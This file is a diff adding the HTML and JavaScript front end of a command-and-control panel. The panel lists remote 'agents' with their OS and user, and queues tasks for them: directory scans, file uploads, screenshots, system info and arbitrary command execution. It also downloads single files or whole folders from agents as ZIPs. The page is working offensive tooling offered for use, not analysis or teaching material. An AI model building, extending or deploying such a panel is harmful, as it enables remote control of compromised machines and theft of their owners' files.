@@ -1,0 +1,724 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>C2 Panel</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
+            background: #0b0e17;
+            color: #e0e4ec;
+            padding: 20px;
+        }
+        .container {
+            max-width: 1440px;
+            margin: 0 auto;
+        }
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding-bottom: 20px;
+            border-bottom: 1px solid #1a2035;
+            margin-bottom: 25px;
+        }
+        .header h1 {
+            font-size: 24px;
+            font-weight: 300;
+            color: #e0e4ec;
+            letter-spacing: 2px;
+        }
+        .header .status {
+            font-size: 13px;
+            color: #6b7a8f;
+        }
+        .header .status .dot {
+            display: inline-block;
+            width: 8px;
+            height: 8px;
+            background: #2ecc71;
+            border-radius: 50%;
+            margin-right: 8px;
+        }
+        .stats {
+            display: flex;
+            gap: 40px;
+            padding: 15px 0;
+            margin-bottom: 25px;
+            border-bottom: 1px solid #1a2035;
+        }
+        .stats .stat-item {
+            display: flex;
+            flex-direction: column;
+        }
+        .stats .stat-item .label {
+            font-size: 11px;
+            text-transform: uppercase;
+            color: #6b7a8f;
+            letter-spacing: 1px;
+        }
+        .stats .stat-item .value {
+            font-size: 22px;
+            font-weight: 300;
+            color: #e0e4ec;
+            margin-top: 4px;
+        }
+        .grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 20px;
+        }
+        .card {
+            background: #111827;
+            border: 1px solid #1a2035;
+            border-radius: 8px;
+            padding: 20px;
+            margin-bottom: 20px;
+        }
+        .card .card-title {
+            font-size: 13px;
+            text-transform: uppercase;
+            color: #6b7a8f;
+            letter-spacing: 1px;
+            margin-bottom: 16px;
+            border-bottom: 1px solid #1a2035;
+            padding-bottom: 10px;
+        }
+        .form-row {
+            display: flex;
+            gap: 10px;
+            flex-wrap: wrap;
+            margin-bottom: 12px;
+        }
+        .form-row select,
+        .form-row input {
+            background: #0b0e17;
+            border: 1px solid #1a2035;
+            color: #e0e4ec;
+            padding: 8px 14px;
+            border-radius: 4px;
+            flex: 1;
+            min-width: 140px;
+            font-size: 13px;
+            font-family: inherit;
+        }
+        .form-row select:focus,
+        .form-row input:focus {
+            outline: none;
+            border-color: #2ecc71;
+        }
+        .form-row select option {
+            background: #111827;
+        }
+        .btn {
+            background: #1a2035;
+            border: 1px solid #2a3045;
+            color: #e0e4ec;
+            padding: 8px 20px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 13px;
+            font-family: inherit;
+            transition: all 0.2s;
+        }
+        .btn:hover {
+            background: #2a3045;
+            border-color: #3a4055;
+        }
+        .btn-primary {
+            background: #2ecc71;
+            border-color: #2ecc71;
+            color: #0b0e17;
+        }
+        .btn-primary:hover {
+            background: #27ae60;
+            border-color: #27ae60;
+        }
+        .btn-success {
+            background: #3498db;
+            border-color: #3498db;
+            color: #0b0e17;
+        }
+        .btn-success:hover {
+            background: #2980b9;
+            border-color: #2980b9;
+        }
+        .btn-danger {
+            background: #e74c3c;
+            border-color: #e74c3c;
+            color: #0b0e17;
+        }
+        .btn-danger:hover {
+            background: #c0392b;
+            border-color: #c0392b;
+        }
+        .list {
+            max-height: 340px;
+            overflow-y: auto;
+        }
+        .list::-webkit-scrollbar {
+            width: 4px;
+        }
+        .list::-webkit-scrollbar-track {
+            background: #0b0e17;
+        }
+        .list::-webkit-scrollbar-thumb {
+            background: #1a2035;
+            border-radius: 4px;
+        }
+        .list-item {
+            background: #0b0e17;
+            padding: 10px 14px;
+            border-radius: 4px;
+            margin-bottom: 6px;
+            border-left: 2px solid #2ecc71;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 13px;
+        }
+        .list-item .online {
+            color: #2ecc71;
+        }
+        .list-item .offline {
+            color: #6b7a8f;
+        }
+        .list-item .meta {
+            font-size: 11px;
+            color: #6b7a8f;
+            margin-top: 2px;
+        }
+        .list-item .status-pending {
+            color: #f39c12;
+        }
+        .list-item .status-completed {
+            color: #2ecc71;
+        }
+        .list-item .status-progress {
+            color: #3498db;
+        }
+        .list-item .file-size {
+            color: #6b7a8f;
+            font-size: 12px;
+        }
+        .list-item .download-link {
+            color: #3498db;
+            text-decoration: none;
+            cursor: pointer;
+            font-size: 13px;
+        }
+        .list-item .download-link:hover {
+            text-decoration: underline;
+        }
+        .empty {
+            color: #6b7a8f;
+            text-align: center;
+            padding: 30px 0;
+            font-size: 13px;
+        }
+        .console {
+            background: #0b0e17;
+            padding: 14px;
+            border-radius: 4px;
+            max-height: 180px;
+            overflow-y: auto;
+            font-family: 'Courier New', monospace;
+            font-size: 12px;
+            color: #6b7a8f;
+            margin-top: 12px;
+        }
+        .console .time {
+            color: #2a3045;
+        }
+        .console .info {
+            color: #3498db;
+        }
+        .console .task {
+            color: #f39c12;
+        }
+        .console .upload {
+            color: #2ecc71;
+        }
+        .console .error {
+            color: #e74c3c;
+        }
+        .download-status {
+            margin-top: 10px;
+            padding: 10px 14px;
+            border-radius: 4px;
+            background: #0b0e17;
+            color: #6b7a8f;
+            font-size: 13px;
+            border: 1px solid #1a2035;
+        }
+        @media (max-width: 900px) {
+            .grid {
+                grid-template-columns: 1fr;
+            }
+            .stats {
+                gap: 20px;
+                flex-wrap: wrap;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>COMMAND &amp; CONTROL</h1>
+            <div class="status">
+                <span class="dot"></span> online
+            </div>
+        </div>
+
+        <div class="stats" id="statsBar">
+            <div class="stat-item">
+                <span class="label">Agents</span>
+                <span class="value" id="agentCount">0</span>
+            </div>
+            <div class="stat-item">
+                <span class="label">Tasks</span>
+                <span class="value" id="taskCount">0</span>
+            </div>
+            <div class="stat-item">
+                <span class="label">Files</span>
+                <span class="value" id="fileCount">0</span>
+            </div>
+            <div class="stat-item">
+                <span class="label">Status</span>
+                <span class="value" id="serverStatus" style="font-size:14px; color:#2ecc71;">active</span>
+            </div>
+        </div>
+
+        <div class="grid">
+            <div>
+                <div class="card">
+                    <div class="card-title">Add Task</div>
+                    <div class="form-row">
+                        <select id="agentSelect">
+                            <option value="">Select agent...</option>
+                        </select>
+                        <select id="commandSelect">
+                            <option value="scan">Scan Directory</option>
+                            <option value="upload">Upload File</option>
+                            <option value="screenshot">Screenshot</option>
+                            <option value="info">System Info</option>
+                            <option value="exec">Execute Command</option>
+                        </select>
+                    </div>
+                    <div class="form-row">
+                        <input id="paramInput" placeholder="Parameter (path or command)">
+                        <button class="btn btn-primary" onclick="addTask()">Add</button>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <div class="card-title">Agents</div>
+                    <div class="list" id="agentList">
+                        <div class="empty">No active agents</div>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <div class="card-title">Download Files from Agent</div>
+                    <div class="form-row">
+                        <select id="downloadAgentSelect">
+                            <option value="">Select agent...</option>
+                        </select>
+                        <input id="downloadPathInput" placeholder="File or folder path">
+                    </div>
+                    <div class="form-row">
+                        <button class="btn btn-success" onclick="downloadSingleFile()">Download File</button>
+                        <button class="btn" onclick="downloadFolder()">Download Folder (ZIP)</button>
+                    </div>
+                    <div id="downloadStatus" class="download-status">Ready</div>
+                </div>
+            </div>
+
+            <div>
+                <div class="card">
+                    <div class="card-title">Tasks</div>
+                    <div class="list" id="taskList">
+                        <div class="empty">No tasks</div>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <div class="card-title">Files</div>
+                    <div class="list" id="fileList">
+                        <div class="empty">No files</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="card">
+            <div class="card-title">Event Log</div>
+            <div class="console" id="consoleLog">
+                <div>System ready...</div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let agents = {};
+        let tasks = {};
+        let files = [];
+        let refreshInterval = null;
+
+        async function loadData() {
+            try {
+                const r1 = await fetch('/api/admin/agents');
+                agents = await r1.json();
+
+                const r2 = await fetch('/api/admin/tasks');
+                tasks = await r2.json();
+
+                const r3 = await fetch('/api/admin/files');
+                files = await r3.json();
+
+                renderAll();
+            } catch (e) {
+                console.error('Load error:', e);
+                addLog('Connection error', 'error');
+            }
+        }
+
+        function renderAll() {
+            renderAgents();
+            renderTasks();
+            renderFiles();
+            updateStats();
+        }
+
+        function renderAgents() {
+            const container = document.getElementById('agentList');
+            const ids = Object.keys(agents);
+
+            if (ids.length === 0) {
+                container.innerHTML = '<div class="empty">No active agents</div>';
+                return;
+            }
+
+            container.innerHTML = ids.map(id => {
+                const a = agents[id];
+                const last = new Date(a.lastSeen);
+                const now = new Date();
+                const diff = (now - last) / 60000;
+                const online = diff < 5;
+
+                return `
+                    <div class="list-item">
+                        <div>
+                            <strong>${id}</strong>
+                            <span class="${online ? 'online' : 'offline'}">${online ? 'online' : 'offline'}</span>
+                            <div class="meta">
+                                ${a.os || 'Unknown'} | ${a.user || 'Unknown'}
+                                <br>Last: ${last.toLocaleString()}
+                            </div>
+                        </div>
+                        <div>
+                            <button class="btn" style="padding:4px 12px;font-size:12px;" onclick="setAgent('${id}')">Select</button>
+                        </div>
+                    </div>
+                `;
+            }).join('');
+
+            const sel = document.getElementById('agentSelect');
+            const dsel = document.getElementById('downloadAgentSelect');
+            const val = sel.value;
+
+            sel.innerHTML = ids.map(id =>
+                `<option value="${id}" ${id === val ? 'selected' : ''}>${id}</option>`
+            ).join('');
+
+            dsel.innerHTML = ids.map(id =>
+                `<option value="${id}">${id}</option>`
+            ).join('');
+        }
+
+        function renderTasks() {
+            const container = document.getElementById('taskList');
+            let all = [];
+
+            Object.keys(tasks).forEach(id => {
+                tasks[id].forEach(t => {
+                    all.push({ ...t, agentId: id });
+                });
+            });
+
+            if (all.length === 0) {
+                container.innerHTML = '<div class="empty">No tasks</div>';
+                return;
+            }
+
+            all.sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt));
+
+            container.innerHTML = all.slice(0, 50).map(t => {
+                const statusMap = {
+                    'pending': 'pending',
+                    'in_progress': 'progress',
+                    'completed': 'completed'
+                };
+                const labelMap = {
+                    'pending': 'pending',
+                    'in_progress': 'in progress',
+                    'completed': 'completed'
+                };
+
+                return `
+                    <div class="list-item">
+                        <div>
+                            <strong>${t.command}</strong>
+                            <span class="status-${statusMap[t.status] || 'pending'}">${labelMap[t.status] || t.status}</span>
+                            <div class="meta">
+                                Agent: ${t.agentId} | ${new Date(t.createdAt).toLocaleString()}
+                                ${t.params?.path ? `| Path: ${t.params.path}` : ''}
+                            </div>
+                        </div>
+                        <div style="font-size:12px;">
+                            ${t.status === 'completed' && t.result ? 'done' : ''}
+                        </div>
+                    </div>
+                `;
+            }).join('');
+        }
+
+        function renderFiles() {
+            const container = document.getElementById('fileList');
+
+            if (!files || files.length === 0) {
+                container.innerHTML = '<div class="empty">No files</div>';
+                return;
+            }
+
+            files.sort((a, b) => new Date(b.modified) - new Date(a.modified));
+
+            container.innerHTML = files.slice(0, 50).map(f => {
+                const size = f.size > 1024 * 1024
+                    ? (f.size / 1024 / 1024).toFixed(2) + ' MB'
+                    : (f.size / 1024).toFixed(1) + ' KB';
+
+                return `
+                    <div class="list-item">
+                        <div>
+                            <strong>${f.name}</strong>
+                            <span class="file-size">${size}</span>
+                            <div class="meta">${new Date(f.modified).toLocaleString()}</div>
+                        </div>
+                        <div>
+                            <a class="download-link" onclick="downloadFile('${f.name}')">download</a>
+                        </div>
+                    </div>
+                `;
+            }).join('');
+        }
+
+        function updateStats() {
+            document.getElementById('agentCount').textContent = Object.keys(agents).length;
+
+            let total = 0;
+            Object.keys(tasks).forEach(id => {
+                total += tasks[id].length;
+            });
+            document.getElementById('taskCount').textContent = total;
+            document.getElementById('fileCount').textContent = files ? files.length : 0;
+        }
+
+        function setAgent(id) {
+            document.getElementById('agentSelect').value = id;
+            addLog(`Selected agent: ${id}`, 'info');
+        }
+
+        async function addTask() {
+            const agentId = document.getElementById('agentSelect').value;
+            const command = document.getElementById('commandSelect').value;
+            const param = document.getElementById('paramInput').value;
+
+            if (!agentId) {
+                alert('Select an agent!');
+                return;
+            }
+
+            if (!command) {
+                alert('Select a command!');
+                return;
+            }
+
+            const params = {};
+            if (param) {
+                if (command === 'scan' || command === 'upload') {
+                    params.path = param;
+                } else if (command === 'exec') {
+                    params.cmd = param;
+                } else {
+                    params.value = param;
+                }
+            }
+
+            try {
+                const res = await fetch('/api/admin/task', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ agentId, command, params })
+                });
+
+                const data = await res.json();
+                if (data.success) {
+                    addLog(`Task added: ${command} for ${agentId}`, 'task');
+                    document.getElementById('paramInput').value = '';
+                    loadData();
+                } else {
+                    addLog(`Error: ${data.error}`, 'error');
+                }
+            } catch (e) {
+                addLog(`Error: ${e.message}`, 'error');
+            }
+        }
+
+        async function downloadFile(filename) {
+            window.open(`/api/admin/download/${filename}`, '_blank');
+            addLog(`Downloading: ${filename}`, 'info');
+        }
+
+        async function downloadSingleFile() {
+            const agentId = document.getElementById('downloadAgentSelect').value;
+            const path = document.getElementById('downloadPathInput').value;
+
+            if (!agentId || !path) {
+                alert('Select agent and enter file path!');
+                return;
+            }
+
+            document.getElementById('downloadStatus').textContent = 'Requesting file...';
+            addLog(`Download request: ${path} from ${agentId}`, 'info');
+
+            try {
+                const res = await fetch('/api/admin/download-file', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ agentId, filePath: path })
+                });
+
+                if (res.ok) {
+                    const blob = await res.blob();
+                    const url = URL.createObjectURL(blob);
+                    const a = document.createElement('a');
+                    a.href = url;
+                    a.download = path.split('/').pop() || path.split('\\').pop() || 'file';
+                    a.click();
+                    document.getElementById('downloadStatus').textContent = 'Download complete';
+                    addLog(`File downloaded: ${path}`, 'upload');
+                } else {
+                    const err = await res.json();
+                    document.getElementById('downloadStatus').textContent = 'Error: ' + err.error;
+                    addLog(`Error: ${err.error}`, 'error');
+                }
+            } catch (e) {
+                document.getElementById('downloadStatus').textContent = 'Error: ' + e.message;
+                addLog(`Error: ${e.message}`, 'error');
+            }
+        }
+
+        async function downloadFolder() {
+            const agentId = document.getElementById('downloadAgentSelect').value;
+            const path = document.getElementById('downloadPathInput').value;
+
+            if (!agentId || !path) {
+                alert('Select agent and enter folder path!');
+                return;
+            }
+
+            document.getElementById('downloadStatus').textContent = 'Processing folder...';
+            addLog(`Folder request: ${path} from ${agentId}`, 'info');
+
+            try {
+                const res = await fetch('/api/admin/download-folder', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ agentId, folderPath: path })
+                });
+
+                if (res.ok) {
+                    const blob = await res.blob();
+                    const url = URL.createObjectURL(blob);
+                    const a = document.createElement('a');
+                    a.href = url;
+                    a.download = `folder_${agentId}_${Date.now()}.zip`;
+                    a.click();
+                    document.getElementById('downloadStatus').textContent = 'Download complete';
+                    addLog(`Folder downloaded: ${path}`, 'upload');
+                } else {
+                    const err = await res.json();
+                    document.getElementById('downloadStatus').textContent = 'Error: ' + err.error;
+                    addLog(`Error: ${err.error}`, 'error');
+                }
+            } catch (e) {
+                document.getElementById('downloadStatus').textContent = 'Error: ' + e.message;
+                addLog(`Error: ${e.message}`, 'error');
+            }
+        }
+
+        function addLog(message, type = 'info') {
+            const container = document.getElementById('consoleLog');
+            const time = new Date().toLocaleTimeString();
+            const cls = type === 'error' ? 'error' : type === 'task' ? 'task' : type === 'upload' ? 'upload' : 'info';
+
+            const entry = document.createElement('div');
+            entry.innerHTML = `<span class="time">[${time}]</span> <span class="${cls}">${message}</span>`;
+            container.appendChild(entry);
+            container.scrollTop = container.scrollHeight;
+
+            while (container.children.length > 100) {
+                container.removeChild(container.firstChild);
+            }
+        }
+
+        function startAutoRefresh() {
+            if (refreshInterval) clearInterval(refreshInterval);
+            refreshInterval = setInterval(loadData, 3000);
+        }
+
+        function connectWebSocket() {
+            try {
+                const ws = new WebSocket('ws://localhost:3001');
+
+                ws.onopen = () => {
+                    addLog('WebSocket connected', 'info');
+                };
+
+                ws.onmessage = (event) => {
+                    try {
+                        const data = JSON.parse(event.data);
+                        if (data.type === 'agents') {}
+                    } catch (e) {}
+                };
+
+                ws.onerror = () => {
+                    addLog('WebSocket error', 'error');
+                };
+
+                ws.onclose = () => {
+                    addLog('WebSocket disconnected', 'error');
+                    setTimeout(connectWebSocket, 5000);
+                };
+            } catch (e) {}
+        }
+
+        loadData();
+        startAutoRefresh();
+        connectWebSocket();
+
+        addLog('System initialized', 'info');
+        addLog('Select agent and add task to begin', 'info');
+
+        console.log('C2 Panel ready');
+    </script>
+</body>
+</html>
